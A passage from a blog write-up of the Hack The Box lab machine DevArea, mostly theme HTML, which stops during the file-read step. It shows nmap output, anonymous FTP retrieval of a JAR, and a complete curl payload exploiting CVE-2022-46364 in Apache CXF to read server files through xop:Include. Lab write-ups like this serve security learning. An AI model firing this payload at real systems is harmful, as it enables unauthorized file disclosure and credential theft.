@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/07/05/hackthebox-devarea/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewDevArea is a medium-difficulty linux machine from Hack The Box dealing initially with an anonymously accessible FTP server leaking a backend employee-service.jar. Decompiling that JAR reveals">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: DevArea">
+<meta property="og:url" content="http://fouedsaidi.com/2026/07/05/Hackthebox-DevArea/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewDevArea is a medium-difficulty linux machine from Hack The Box dealing initially with an anonymously accessible FTP server leaking a backend employee-service.jar. Decompiling that JAR reveals">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DevArea/DevArea.png">
+<meta property="article:published_time" content="2026-07-05T09:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-05T14:54:01.486Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/DevArea/DevArea.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: DevArea -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: DevArea</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-07-05 12:00</span>
+        <span class="mobile">2026-07-05 12:00</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-07-05 17:54:01</span>
+            <span class="mobile">2026-07-05 17:54:01</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>DevArea is a medium-difficulty linux machine from Hack The Box dealing initially with an anonymously accessible FTP server leaking a backend <code>employee-service.jar</code>. Decompiling that JAR reveals an Apache CXF SOAP service vulnerable to CVE-2022-46364, an MTOM&#x2F;XOP <code>xop:Include</code> Local File Inclusion which we’ll abuse to read the HoverFly systemd service file and extract plaintext admin credentials. From there we’ll authenticate to the HoverFly Admin API, abuse its middleware feature (GHSA-r4h8-hfp2-ggmf) to land a reverse shell as <code>dev_ryan</code>. Finally, we’ll escalate to root by combining a passwordless sudo entry on <code>syswatch.sh</code> with a world-writable <code>/bin/bash</code>, replacing the interpreter to spawn a SUID rootbash.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/DevArea/DevArea.png"
+                      alt="DevArea-info-card"
+                ><figcaption>DevArea-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>The first step is to identify what services are running on the target machine. We run an nmap scan with default scripts (<code>-sC</code>), version detection (<code>-sV</code>), and scan all 65535 ports (<code>-p-</code>) to ensure we don’t miss anything running on non-standard ports.</p>
+<p>We also add the hostname <code>devarea.htb</code> to our <code>/etc/hosts</code> file so that name-based virtual hosting works correctly when we interact with the web services.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;10.129.21.82 devarea.htb&quot;</span> | sudo <span class="built_in">tee</span> -a /etc/hosts</span><br><span class="line">10.129.21.82 devarea.htb</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nmap -sC -sV -p- 10.129.21.82</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-01 20:52 PDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> devarea.htb (10.129.21.82)</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 3.0.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.16.178</span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth <span class="built_in">limit</span></span><br><span class="line">|      Session <span class="built_in">timeout</span> <span class="keyword">in</span> seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 1</span><br><span class="line">|      vsFTPd 3.0.5 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)</span><br><span class="line">|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.58</span><br><span class="line">|_http-title: DevArea - Connect with Top Development Talent</span><br><span class="line">|_http-server-header: Apache/2.4.58 (Ubuntu)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.27.v20200227</span><br><span class="line">|_http-server-header: Jetty(9.4.27.v20200227)</span><br><span class="line">|_http-title: Error 404 Not Found</span><br><span class="line">8500/tcp open  http    Golang net/http server</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/plain; charset=utf-8).</span></span><br><span class="line"><span class="string">8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)</span></span><br><span class="line"><span class="string">|_http-title: Hoverfly Dashboard</span></span><br><span class="line"><span class="string">Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 57.69 seconds</span></span><br></pre></td></tr></table></figure></div>
+
+<p>The scan reveals six open ports. The most interesting findings are:</p>
+<ul>
+<li><strong>Port 21 (FTP)</strong>: Anonymous login is allowed, and there’s a <code>pub</code> directory visible – this is worth investigating for files left behind.</li>
+<li><strong>Port 80 (HTTP)</strong>: A standard Apache web server hosting “DevArea - Connect with Top Development Talent”.</li>
+<li><strong>Port 8080 (Jetty)</strong>: A Java-based Jetty web server, likely hosting a backend service or API.</li>
+<li><strong>Port 8500</strong>: A Go-based HTTP server that identifies itself as a proxy server – this turns out to be HoverFly Proxy.</li>
+<li><strong>Port 8888</strong>: Another Go-based HTTP server with the title “Hoverfly Dashboard” – this is the HoverFly Admin API and web dashboard.</li>
+</ul>
+<h2 id="FTP-Enumeration"><a href="#FTP-Enumeration" class="headerlink" title="FTP Enumeration"></a>FTP Enumeration</h2><p>Since nmap already told us anonymous FTP login is allowed, we connect to the FTP server and browse the <code>pub</code> directory. Inside, we find a Java archive file called <code>employee-service.jar</code> which is likely the backend application running on port 8080.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ ftp 10.129.21.82</span><br><span class="line">Connected to 10.129.21.82.</span><br><span class="line">220 (vsFTPd 3.0.5)</span><br><span class="line">Name (10.129.21.82:kali): anonymous</span><br><span class="line">230 Login successful.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> pub</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; <span class="built_in">ls</span></span><br><span class="line">-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar</span><br><span class="line">ftp&gt; get employee-service.jar</span><br><span class="line">226 Transfer complete.</span><br><span class="line">6445030 bytes received</span><br><span class="line">ftp&gt; <span class="built_in">bye</span></span><br><span class="line">221 Goodbye.</span><br></pre></td></tr></table></figure></div>
+
+<p>We now have a copy of the backend JAR file. This is a goldmine for understanding the application’s internals, endpoints, and potential vulnerabilities.</p>
+<h2 id="JAR-Analysis"><a href="#JAR-Analysis" class="headerlink" title="JAR Analysis"></a>JAR Analysis</h2><p>A JAR (Java Archive) file is essentially a ZIP archive containing compiled Java classes and resources. We extract it to examine the application’s source code by decompiling the <code>.class</code> files.</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">mkdir</span> jar_analysis &amp;&amp; <span class="built_in">cd</span> jar_analysis</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/jar_analysis]</span><br><span class="line">└─$ jar xf ../employee-service.jar</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/jar_analysis]</span><br><span class="line">└─$ find . -name <span class="string">&quot;*.class&quot;</span> | grep -iE <span class="string">&quot;(Employee|Report|Server)&quot;</span> | grep -v <span class="string">&quot;org/&quot;</span> | grep -v <span class="string">&quot;javax/&quot;</span></span><br><span class="line">./com/devarea/EmployeeService.class</span><br><span class="line">./com/devarea/EmployeeServiceImpl.class</span><br><span class="line">./com/devarea/Report.class</span><br><span class="line">./com/devarea/ServerStarter.class</span><br></pre></td></tr></table></figure></div>
+
+<p>After decompiling these classes (using a tool like CFR or JD-GUI), we learn the following:</p>
+<ul>
+<li><strong><code>ServerStarter.class</code></strong>: The main class that starts a Jetty web server on port 8080 and publishes a SOAP web service using the <strong>Apache CXF</strong> framework at the endpoint <code>/employeeservice</code>.</li>
+<li><strong><code>EmployeeService.class</code></strong>: An interface defining the SOAP service contract.</li>
+<li><strong><code>EmployeeServiceImpl.class</code></strong>: The implementation class that exposes a <code>submitReport</code> method.</li>
+<li><strong><code>Report.class</code></strong>: A data class with fields: <code>employeeName</code>, <code>department</code>, <code>content</code>, and <code>confidential</code>.</li>
+</ul>
+<p>We can also confirm the SOAP endpoint is live by fetching the WSDL (Web Services Description Language) descriptor:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/jar_analysis]</span><br><span class="line">└─$ curl -s http://devarea.htb:8080/employeeservice?wsdl | <span class="built_in">head</span> -20</span><br><span class="line">&lt;?xml version=<span class="string">&#x27;1.0&#x27;</span> encoding=<span class="string">&#x27;UTF-8&#x27;</span>?&gt;</span><br><span class="line">&lt;wsdl:definitions xmlns:xsd=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span></span><br><span class="line">  xmlns:wsdl=<span class="string">&quot;http://schemas.xmlsoap.org/wsdl/&quot;</span></span><br><span class="line">  xmlns:tns=<span class="string">&quot;http://devarea.htb/&quot;</span></span><br><span class="line">  name=<span class="string">&quot;EmployeeServiceImplService&quot;</span></span><br><span class="line">  targetNamespace=<span class="string">&quot;http://devarea.htb/&quot;</span>&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></div>
+
+<p>The WSDL confirms the <code>submitReport</code> operation and the namespace <code>http://devarea.htb/</code>. The fact that this uses <strong>Apache CXF</strong> is critical – this framework has known vulnerabilities related to XOP&#x2F;MTOM handling.</p>
+<h2 id="LFI-via-XOP-MTOM-CVE-2022-46364"><a href="#LFI-via-XOP-MTOM-CVE-2022-46364" class="headerlink" title="LFI via XOP&#x2F;MTOM (CVE-2022-46364)"></a>LFI via XOP&#x2F;MTOM (CVE-2022-46364)</h2><p>Apache CXF versions before 3.5.5 and 3.4.10 are vulnerable to <strong>CVE-2022-46364</strong>, a Server-Side Request Forgery (SSRF) &#x2F; Local File Inclusion (LFI) vulnerability. The flaw exists in how Apache CXF processes MTOM (Message Transmission Optimization Mechanism) attachments with XOP (XML-binary Optimized Packaging) Include directives.</p>
+<p>When a SOAP request uses multipart&#x2F;related content type with an <code>xop:Include</code> element, the CXF framework fetches the URI specified in the <code>href</code> attribute. If a <code>file://</code> URI is used, the server reads the local file and includes its contents (base64-encoded) in the SOAP response. This allows an attacker to read arbitrary files from the server’s filesystem.</p>
+<p>The key injection point is replacing the value of a field (like <code>employeeName</code>) with an <code>xop:Include</code> tag pointing to a local file. The server processes it, reads the file, and reflects the base64-encoded content back in the response.</p>
+<p>First, we verify the vulnerability works by reading <code>/etc/hostname</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ curl -s -X POST <span class="string">&quot;http://10.129.21.82:8080/employeeservice&quot;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: multipart/related; type=&quot;application/xop+xml&quot;; start=&quot;&lt;root.message@cxf.apache.org&gt;&quot;; start-info=&quot;text/xml&quot;; boundary=&quot;----=_Part_1&quot;&#x27;</span> \</span><br><span class="line">  -d $<span class="string">&#x27;------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type=&quot;text/xml&quot;\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: &lt;root.message@cxf.apache.org&gt;\r\n\r\n&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot;&gt;\r\n   &lt;soapenv:Header/&gt;\r\n   &lt;soapenv:Body&gt;\r\n      &lt;dev:submitReport&gt;\r\n         &lt;arg0&gt;\r\n            &lt;employeeName&gt;&lt;xop:Include xmlns:xop=&quot;http://www.w3.org/2004/08/xop/include&quot; href=&quot;file:///etc/hostname&quot;/&gt;&lt;/employeeName&gt;\r\n            &lt;department&gt;IT&lt;/department&gt;\r\n            &lt;content&gt;test&lt;/content&gt;\r\n            &lt;confidential&gt;false&lt;/confidential&gt;\r\n         &lt;/arg0&gt;\r\n      &lt;/dev:submitReport&gt;\r\n   &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;\r\n------=_Part_1--&#x27;</span></span><br><span class="line">&lt;soap:Envelope xmlns:soap=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;&lt;soap:Body&gt;&lt;ns2:submitReportResponse xmlns:ns2=<span class="string">&quot;http://devarea.htb/&quot;</span>&gt;&lt;<span class="built_in">return</span>&gt;Report received from ZGV2YXJlYQo=. Department: IT. Content: <span class="built_in">test</span>&lt;/return&gt;&lt;/ns2:submitReportResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>The response contains <code>ZGV2YXJlYQo=</code> in the <code>employeeName</code> position. Let’s decode that base64 string:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">&quot;ZGV2YXJlYQo=&quot;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">devarea</span><br></pre></td></tr></table></figure></div>
+
+<p>The hostname is <code>devarea</code> – the LFI is confirmed working. Now we know the target has HoverFly services running on ports 8500 and 8888. HoverFly is an API simulation tool that runs as a system service. Systemd service files often contain configuration details including credentials passed as command-line arguments. Let’s read the HoverFly service file:</p>
